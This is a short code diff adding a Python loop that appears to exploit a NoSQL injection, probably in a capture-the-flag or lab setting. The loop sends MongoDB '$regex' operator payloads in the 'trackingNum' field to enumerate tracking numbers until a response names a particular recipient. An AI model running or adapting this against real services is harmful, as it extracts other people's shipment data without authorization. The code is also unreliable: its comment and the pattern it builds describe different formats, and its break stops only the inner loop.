@@ -53,3 +53,27 @@ print("Final tracking number:", ''.join(found_characters))
 
 ##
 ##
+
+##
+##
+
+# Assuming the tracking number format is "UPSxxxAXXXXX" where X is the variable character
+
+##
+##
+
+for i in range(10):  # Iterating through digits 0-9 for the variable character
+    for letter in string.ascii_uppercase:  # Iterating through uppercase letters A-Z for the variable character
+        tracking_number = f"UPS###{i:05d}{letter}"
+        data = {"trackingNum": {"$regex": f"^{tracking_number}.*"}}
+        response = requests.post(base_url, headers=headers, json=data)
+
+        print(f"Trying tracking number: {tracking_number}")
+        if "Recipient:          Franz Pflaumenbaum" in response.text:
+            print("Match found!")
+            print(response.text)
+            break
+        else:
+            print("No match.")
+        print("-" * 30)
+        
